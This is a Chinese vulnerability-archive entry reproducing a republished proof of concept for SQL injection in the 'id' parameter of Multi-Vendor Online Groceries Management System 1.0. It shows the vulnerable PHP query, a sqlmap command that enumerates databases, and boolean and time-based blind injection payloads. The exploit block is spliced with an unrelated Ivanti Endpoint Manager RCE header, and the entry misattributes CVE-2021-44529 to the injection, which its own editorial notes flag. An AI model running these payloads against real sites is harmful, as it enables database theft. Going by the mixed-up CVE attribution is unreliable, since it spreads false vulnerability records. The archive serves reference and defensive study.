---
identifier_role: "reference"
primary_identifiers: ""
referenced_identifiers: "CVE-2021-44529"
identifier_status: "unknown"
title: "历史 PoC：SQL注入 Multi-Vendor Online Groceries Management System"
product: "Multi-Vendor Online Groceries Management System"
record_type: "vulnerability"
document_type: "拼接错误的SQL注入PoC转载"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "PHP mvogms1.0、XAMPP/Windows10测试；GET产品id入口，认证情况未说明"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/0day%20EXP/0day%20EXP%20SQL%E6%B3%A8%E5%85%A5%20Multi-Vendor%20Online%20Groceries%20Management%20System.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://mp.weixin.qq.com/s/yIgFMstENJ0JStPrqaUjfA"
id: "vw-8e7f439ac0ab874951008977"
entity_id: "ve-8e7f439ac0ab874951008977"
schema_version: "1"
---

# 历史 PoC：SQL注入 Multi-Vendor Online Groceries Management System

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：Multi-Vendor Online Groceries Management System
- 文献类型：拼接错误的SQL注入PoC转载
- 版本、权限及部署边界：PHP mvogms1.0、XAMPP/Windows10测试；GET产品id入口，认证情况未说明
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 明确跨产品混稿：标题/说明/SQL代码是mvogms，代码开头却IvantiEndpointManager/CSA4.6RCE及44529，frontmatter据此误归CVE
2. 应移除错贴Ivanti片段或拆为来源勘误，不能把44529赋给SQL注入；mvogms真实CVE需另核不得编造
3. 桌面软件目录不符Web电商PHP应用，应迁对应Web系统分类
4. id直接拼SQL根因与boolean/timeblind示例一致，但没有完整HTTP响应/真实测试配置；sqlmap枚举输出不能替代修复说明
5. SourceCodester和作者信息可追溯但源码未固定版，缺厂商/补丁与鉴权前提；去0day/情人节营销

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://mp.weixin.qq.com/s/yIgFMstENJ0JStPrqaUjfA>
- 原文参考链接（未重新核验）：<http://ksria.com/simpread/>
- 原文参考链接（未重新核验）：<https://www.ivanti.com/>
- 原文参考链接（未重新核验）：<https://forums.ivanti.com/s/article/Customer-Update-Cloud-Service-Appliance-4-6>
- 原文参考链接（未重新核验）：<https://www.sourcecodester.com/>
- 原文参考链接（未重新核验）：<https://www.sourcecodester.com/php/15166/multi-vendor-online-groceries-management-system-phpoop-free-source-code.html>

### 归档技术正文

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/yIgFMstENJ0JStPrqaUjfA)

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失,均由使用者本人负责，EXP 与 POC 仅仅只供对已授权的目标使用测试，对未授权目标的测试本公众号不承担责任，均由本人自行承担。本公众号中的漏洞均为公开的漏洞收集！如果本文您认为不适宜被发布，请在后台联系我们删除，或发送到运营的电子邮箱：tang_wenshu@outlook.com。

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

VALENTINE'S DAY

  

  

漏洞说明
----

这是一个PHP名称为多供应商在线杂货管理系统。这是一个基于Web的应用程序，可帮助消费者和供应商在线开展业务。该系统可作为可以处理多个供应商的杂货的在线商店或商店平台。这允许多个供应商在线发布其可用产品。

**威胁级别：**【严重】

**漏洞类型：**SQL注入

**影响版本：**

Multi-Vendor Online Groceries Management System 1.0

漏洞EXP
-----

```
# Exploit Title: Ivanti Endpoint Manager 4.6 - Remote Code Execution (RCE)  
# Date: 20/03/2022   
# Exploit Author: d7x   
# Vendor Homepage: https://www.ivanti.com/   
# Software Link: https://forums.ivanti.com/s/article/Customer-Update-Cloud-Service-Appliance-4-6   
# Version: CSA 4.6 4.5 - EOF Aug 2021   
# Tested on: Linux x86_64  
# CVE : CVE-2021-44529  
  
###  
# Exploit Title: Multi-Vendor Online Groceries Management System 1.0 - 'id' Blind SQL Injection  
# Date: 11/02/2022  
# Exploit Author: Saud Alenazi  
# Vendor Homepage: https://www.sourcecodester.com/  
# Software Link: https://www.sourcecodester.com/php/15166/multi-vendor-online-groceries-management-system-phpoop-free-source-code.html  
# Version: 1.0  
# Tested on: XAMPP, Windows 10  
  
  
# Vulnerable Code  
  
line 2 in file "mvogms/products/view_product.php  
  
$qry = $conn->query("SELECT  p.*, v.shop_name as vendor, c.name as `category` FROM `product_list` p inner join vendor_list v on p.vendor_id = v.id inner join category_list c on p.category_id = c.id where p.delete_flag = 0 and p.id = '{$_GET['id']}'");  
  
# Sqlmap command:  
  
sqlmap -u 'localhost/mvogms/?page=products/view_product&id=3' -p id --level=5 --risk=3 --dbs --random-agent --eta --batch  
  
# Output:  
  
Parameter: id (GET)  
    Type: boolean-based blind  
    Title: AND boolean-based blind - WHERE or HAVING clause  
    Payload: page=products/view_product&id=3' AND 9973=9973-- ogag  
  
    Type: time-based blind  
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)  
    Payload: page=products/view_product&id=3' AND (SELECT 2002 FROM (SELECT(SLEEP(5)))anjK)-- glsQ 
```

  

  





  

  



后台回复“粉丝群”加入公众号粉丝群

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
